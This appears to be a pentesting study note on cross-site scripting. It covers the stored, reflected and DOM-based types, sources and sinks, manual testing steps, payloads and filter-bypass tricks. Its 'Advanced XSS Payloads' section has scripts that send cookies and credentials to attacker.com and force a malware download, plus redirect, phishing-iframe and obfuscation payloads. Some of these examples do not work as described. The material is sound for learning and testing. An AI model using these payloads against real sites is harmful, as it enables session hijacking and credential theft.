# Index
- [[Front End Vulnerabilities]]
	- [[1. Sensitive Data Exposure]]
	- [[2. HTML Injection]]
	- [[3. Insecure Direct Object References (IDOR)]]
	- [[4. Cross-Site Scripting (XSS)]]
	- [[5. Cross-Site Request Forgery (CSRF)]]
	- [[6. Insufficient Transport Layer Protection]]
	- [[7. Insecure Handling of Cookies and Sessions]]
	- [[8. Security Misconfigurations|8. Security Misconfigurations]]

# Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is a vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. This occurs when user input is not properly sanitized before being included in the web page’s HTML or JavaScript context. When a victim views the page, the injected script is executed in their browser, leading to a range of potential consequences, such as stealing cookies, session hijacking, or redirecting users to malicious websites.

# How XSS Works

1. **Injection:** The attacker injects a malicious script into a web application. This can be done through various input points like form fields, URL parameters, or any user input that is not properly sanitized.    
2. **Execution:** The injected script is executed in the context of the user's browser when they visit the compromised page.
3. **Impact:** The malicious script can perform various actions, such as:    
    - **Session Hijacking:** Stealing cookies or session tokens to impersonate the user.
    - **Phishing:** Displaying fake login forms to steal credentials.
    - **Defacement:** Modifying the appearance of the website.
    - **Malware Distribution:** Redirecting users to malicious sites or downloading malware.

# Types of XSS

## Stored XSS (Persistent)
The malicious script is permanently stored on the target server, such as in a database, comment field, forum post, etc. The script is then delivered to users when they request the stored information.
  
   - **Example:** A user posts a comment on a forum that includes a script. Every time another user views the comment, the script is executed in their browser. An attacker posts a comment on a forum that includes a script:

```html
<script>alert('XSS');</script>
```

When another user views the comment, the script runs and displays an alert box. To see whether the payload is persistent and stored on the back-end, we can refresh the page and see whether we get the alert again. If we do, we would see that we keep getting the alert even throughout page refreshes, confirming that this is indeed a Stored/Persistent XSS vulnerability. This is not unique to us, as any user who visits the page will trigger the XSS payload and get the same alert.

### How Stored XSS Works

1. **Injection:** An attacker injects a malicious script into a web application input that stores data on the server. This could be through a comment field, a user profile, a message board, or any other input that is saved and displayed to users.

```html
<script>alert('XSS');</script>
```

2. **Storage:** The injected script is stored on the server in a database or similar storage mechanism without proper sanitization or validation.
3. **Retrieval:** When a legitimate user requests the affected data, the stored script is included in the response.
4. **Execution:** The user's browser executes the script in the context of the vulnerable web application, potentially leading to various malicious activities.

## Reflected XSS (Non-Persistent)
Reflected XSS, which gets processed by the back-end server, is a malicious script reflected off a web application to the victim's browser. It occurs when data sent to a website is immediately included in the response without proper validation or encoding.
  
- **Example:** An attacker sends a link to a victim that includes malicious script code in the URL. When the victim clicks on the link, the script is reflected back and executed by the victim's browser. An attacker crafts a URL like:

```html
http://example.com/search?q=<script>alert('XSS')</script>
```

If the server reflects the `q` parameter back in the response without sanitization, the script runs in the user's browser.

### How Reflected XSS Works

1. **User Input:** An attacker crafts a URL containing a malicious script in one of the query parameters or other user input fields.
2. **Server Reflection:** The web server processes the input and reflects it back in the response HTML.
3. **Script Execution:** The victim clicks the malicious link, and the reflected script executes in their browser within the context of the vulnerable website.

### Example Scenario
Consider the following URL:

```html
http://example.com/search?q=<script>alert('XSS')</script>
```

If the server includes the `q` parameter value in the response HTML without sanitization, the script will execute in the victim's browser:

```html
<!DOCTYPE html>
<html>
<body>
  <h1>Search Results for "<script>alert('XSS')</script>"</h1>
</body>
</html>
```

When the victim visits the URL, the `<script>` tag is executed, displaying an alert box.

## DOM-based XSS (Non-Persistent)
The vulnerability exists in the client-side script rather than server-side. DOM XSS occurs when JavaScript is used to change the page source through the Document Object Model (DOM).

   - **Example:** A web application uses `document.location` or `document.URL` to add content to the page without proper sanitization. An attacker can manipulate the URL to include a script that modifies the DOM. A vulnerable JavaScript snippet:

```html
document.getElementById("output").innerHTML = location.hash.substring(1);
```

An attacker can exploit this by sending a URL like:

```html
http://example.com/#<script>alert('XSS')</script>
```

When the page loads, the script executes.

### Source & Sink
In the context of DOM-based Cross-Site Scripting (XSS), the concepts of "Source" and "Sink" are crucial to understanding how the vulnerability occurs and how to identify it.

#### Source
A Source in DOM-based XSS refers to the point in the client-side code where data is read from a potential attacker-controlled input. This data can come from various parts of the web environment, such as URL parameters, hash fragments, cookies, or other web storage mechanisms.

- Common Sources
	- **`document.URL`:** The entire URL of the current document.
	- **`document.location`:** Similar to `document.URL`, it contains the URL of the current document.
	- **`document.referrer`:** The URL of the previous document that linked to the current document.
	- **`window.name`:** The name of the current window.
	- **`document.cookie`:** Cookies associated with the current document.
	- **`localStorage` and `sessionStorage`:** Web storage objects.
	- **`location.hash`:** The fragment identifier of the URL (portion after the `#` symbol).

##### Examples of Sources

- **URL Parameters:**

```html
var param = new URLSearchParams(window.location.search).get('input');
```

- **Hash Fragment:**

```html
var hash = location.hash.substring(1);
```
  
#### Sink
A Sink in DOM-based XSS refers to the point in the client-side code where the data from a source is inserted into the DOM or executed in a way that can cause the execution of malicious scripts. The vulnerability arises when data from an untrusted source is directly manipulated or rendered without proper sanitization or escaping.

- Common Sinks
	- **`innerHTML`:** Inserts HTML content into an element.
	- **`outerHTML`:** Similar to `innerHTML` but replaces the element itself.
	- **`document.write`:** Writes HTML directly to the document.
	- **`eval`:** Executes JavaScript code represented as a string.
	- **`setTimeout` and `setInterval`:** Executes a string of code after a specified delay or at regular intervals.
	- **`location` and `location.href`:** Navigates to a new URL.
	- **`Element.src` or `Element.href`:** Sets the source or href attribute of an element.

##### Examples of Sinks

- **Injecting HTML Content:**
  
```html
document.getElementById('output').innerHTML = param;
```

- **Executing Code:**

```html
eval(param);
```

### How DOM-based XSS Occurs

1. **Source:** Data is read from a source that can be controlled by an attacker, such as URL parameters or hash fragments.
2. **Sink:** The data is then inserted into a sink without proper sanitization or escaping, allowing the attacker to execute malicious scripts.

### Example Scenario
Consider the following HTML and JavaScript code:

```html
<!DOCTYPE html>
<html>
<body>
  <div id="output"></div>
  <script>
    var hash = location.hash.substring(1); // Source
    document.getElementById('output').innerHTML = hash; // Sink
  </script>
</body>
</html>
```

1. **Source:** `location.hash.substring(1)` reads the hash fragment from the URL.
2. **Sink:** `innerHTML` inserts the content of the hash fragment into the DOM.

If an attacker crafts a URL like `http://example.com/#<script>alert('XSS')</script>`, the script will execute when the page loads, resulting in an XSS vulnerability.

# Manual Discovery Techniques for XSS

To manually discover XSS vulnerabilities, testers can inspect web applications for points where user input is reflected back into HTML or JavaScript without being properly sanitized. Below are step-by-step techniques to identify XSS vulnerabilities.

## Identify Potential Injection Points

Common areas for XSS vulnerabilities include:
- **Search fields** where user queries are reflected.
- **Comment sections** where user input is displayed.
- **Form fields** such as "Username," "Email," or "Description."
- **URL query parameters** used in GET requests.
- **Error messages** that reflect user input in the response.

By identifying these areas, you can target your testing to likely vulnerable spots.

## Test with Basic XSS Payloads

Begin testing with simple XSS payloads to see if the input is reflected and executed without proper escaping or sanitization.

**Basic XSS Payloads:**

```html
<script>alert('XSS Test');</script>
<img src="x" onerror="alert('XSS Test');">
```

Here’s how to test:
- **Search fields:** Input `<script>alert('XSS Test');</script>` into the search field and submit.
- **Comment sections:** Post a comment with an XSS payload like `<script>alert('XSS Test');</script>`.
- **Form fields:** Inject a script into form fields like "Username" or "Email" and observe the result.
- **URL query parameters:** Modify URL parameters like `http://<target_domain>/search.php?query=<script>alert('XSS Test');</script>`.
- **Error messages:** Inject XSS payloads into fields that trigger error messages, such as login forms.

If the script executes, the input is not properly sanitized, and the application may be vulnerable to XSS.

## Modify Query Parameters

URL query parameters can also be vulnerable to XSS. Modify parameters with XSS payloads to test if the injected script is reflected in the response.

Original URL:
```html
http://<target_domain>/search.php?query=test
```

Inject an XSS payload:
```html
http://<target_domain>/search.php?query=<script>alert('XSS Test');</script>
```

If the alert box is displayed, it indicates a reflected XSS vulnerability.

## Inject XSS into Form Fields

Forms are another common source of XSS vulnerabilities. Inject XSS payloads into fields like "Name," "Comment," or "Bio," and observe the response.

Example form field payloads:

```html
<script>alert('XSS Test');</script>
<img src="x" onerror="alert('XSS Test');">
```

Submit the form and check the resulting page for script execution. If the script runs, the application is vulnerable to XSS.

## Test Error Messages

XSS vulnerabilities can occur in error messages that reflect user input. For instance, login forms might display the user’s input if an incorrect username or password is provided.

Example:

```html
Username: <script>alert('XSS Test');</script>
Password: <any_password>
```

If the alert is triggered, it suggests an XSS vulnerability in the error message handling.

## Use Interception Tools

Tools like **Burp Suite** or **OWASP ZAP** allow you to inspect HTTP requests and responses. You can inject XSS payloads into input fields or query parameters and see if the input is reflected unsanitized in the response.

Example:

```http
GET /search.php?query=<script>alert('XSS Test');</script> HTTP/1.1
Host: <target_domain>
```

Inspect the response to see if the XSS payload is executed in the browser.

## Inspect HTML Source with Developer Tools

After injecting XSS payloads, use browser developer tools to inspect the source code of the page. Right-click on the page and select **"View Source"** or **"Inspect Element"** to see how your input is rendered in the DOM.

For example, check if the injected script is included unescaped in the HTML:
```html
<script>alert('XSS Test');</script>
```

If it is, this indicates an XSS vulnerability.

# XSS Payloads

## Crafting XSS Payloads
When crafting XSS payloads, attackers consider several factors:

1. **Context:** The context in which the input is used (HTML, JavaScript, attributes, etc.) affects the payload design.
2. **Encoding:** Different encoding methods (URL encoding, HTML encoding) can be used to bypass filters.
3. **Filter Evasion:** Techniques like obfuscation and encoding are used to evade security filters.

#### Example of Context-Specific Payloads

1. **HTML Context**

```html
<p>Welcome, <b><?php echo $_GET['name']; ?></b></p>
```

Payload:

```html
<script>alert('XSS');</script>
```

2. **JavaScript Context**

```html
<script> var user = "<?php echo $_GET['user']; ?>"; alert(user); </script>
```

Payload:

```html
"; alert('XSS'); //
```

3. **Attribute Context**

```html
<img src="<?php echo $_GET['image']; ?>">
```

Payload:

```html
x" onerror="alert('XSS');
```

## Basic Payloads
These payloads are simple and often used for testing the presence of an XSS vulnerability.

- **Alert Box:** This payload triggers a JavaScript alert box displaying the message 'XSS'. It's a basic way to confirm that an XSS vulnerability exists.

```html
<script>alert('XSS');</script>
```

- **Image Error:** This payload uses an image tag with an invalid source. When the image fails to load, the `onerror` event handler triggers the alert.

```html
<img src="x" onerror="alert('XSS');">
```

- **SVG Payload:** This payload uses an SVG (Scalable Vector Graphics) tag with an `onload` event handler to trigger the alert.

```html
<svg/onload=alert('XSS')>
```

## Advanced XSS Payloads

- **Cookie Theft:** This payload redirects the user's browser to the attacker's site, including the user's cookies as a URL parameter.

```html
<script>document.location="http://attacker.com/steal?cookie="+document.cookie;</script>
```

- **Keylogger:** This script listens for keypress events and sends the captured keystrokes to an attacker's server.

```html
<script>
document.onkeypress = function(e) {
    var key = e.which || e.keyCode;
    alert('Key pressed: ' + String.fromCharCode(key));
};
</script>
```

- **Redirect:**

```html
<script>window.location="http://malicious.com";</script>
```

- **Iframe Injection (Phishing):**

```html
<iframe src="http://malicious.com" width="500" height="500"></iframe>
```

- **Obfuscated XSS (Bypassing Filters):**

```html
<script>String.fromCharCode(97,108,101,114,116)(document.cookie);</script>
```

- **Fake Login Form:** This payload replaces the page content with a fake login form that submits credentials to an attacker-controlled server.

```html
<script>
document.body.innerHTML = '<form action="http://attacker.com/phish" method="POST">Username: <input type="text" name="username"><br>Password: <input type="password" name="password"><br><input type="submit" value="Login"></form>';
</script>
```

- **Malicious Download:** This script creates an invisible link to a malicious executable and automatically clicks it to initiate the download.

```html
<script>
var a = document.createElement('a');
a.href = 'http://attacker.com/malware.exe';
a.download = 'malware.exe';
document.body.appendChild(a);
a.click();
</script>
```

# Bypassing Defenses

Attackers often bypass defenses using encoding, obfuscation, or leveraging browser inconsistencies.

## Encoding and Obfuscation

- **HTML Entity Encoding:** Encode special characters using HTML entities to bypass filters that block `<script>` tags.

```html
&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
```

- **Hex/Unicode Encoding:** Use hexadecimal or Unicode encoding to represent characters.

```html
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```

## Filter Bypass Techniques

- **Comment Obfuscation:** Use HTML comments to break up payloads and bypass filters.

```html
<scr<!-- -->ipt>alert('XSS');</scr<!-- -->ipt>
```

- **Mixed Contexts:** Create payloads that work in multiple contexts and can bypass context-specific filters.

```html
<style>@import'javascript:alert(1)';</style>
```

```html
"><img src=x onerror=alert(1)//">
```

## Browser Inconsistencies

1. **Exploiting Browser Quirks:** Use inconsistencies in how different browsers parse HTML and JavaScript to bypass filters.

```html
<scr\00ipt>alert('XSS');</scr\00ipt>
```

2. **Mixed Contexts:** Combine different contexts, such as CSS and JavaScript, to evade filters.

```html
<style>@import'javascript:alert(1)';</style>
```

# Resources

|**Website**|**URL**|
|-|-|
| Veracode - XSS Basics                                               | [https://www.veracode.com/security/xss](https://www.veracode.com/security/xss)                                                                             |
| Github - PayloadBox - XXS Payloads                                  | [https://github.com/payloadbox/xss-payload-list](https://github.com/payloadbox/xss-payload-list)                                                           |
| Github - TheLinuxGuy001 - XXS Cheatsheet                            | [https://github.com/thelinuxguy001/xss_cheatsheet](https://github.com/thelinuxguy001/xss_cheatsheet)                                                       |
| GitHub - PayloadAllTheThings - Cross Site Scripting Injection       | [https://github.com/0x065C/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/0x065C/PayloadsAllTheThings/tree/master/XSS%20Injection)   |
| GitHub - PayloadAllTheThings - Cross Site Request Forgery Injection | [https://github.com/0x065C/PayloadsAllTheThings/tree/master/CSRF%20Injection](https://github.com/0x065C/PayloadsAllTheThings/tree/master/CSRF%20Injection) |